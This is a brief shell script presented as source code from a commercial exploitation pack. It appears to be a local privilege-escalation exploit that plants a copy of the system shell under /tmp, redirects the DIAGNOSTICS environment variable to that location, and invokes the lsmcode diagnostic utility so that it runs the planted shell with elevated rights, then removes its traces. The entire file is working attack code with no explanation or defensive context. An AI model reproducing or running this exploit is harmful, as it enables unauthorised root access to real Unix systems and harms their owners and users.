#!/bin/sh

# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008

DCTRL="/tmp/aap/bin/Dctrl"

mkdirhier /tmp/aap/bin
export DIAGNOSTICS=/tmp/aap
cp sh $DCTRL
chmod 755 $DCTRL
/usr/sbin/lsmcode
rm -fr /tmp/aap
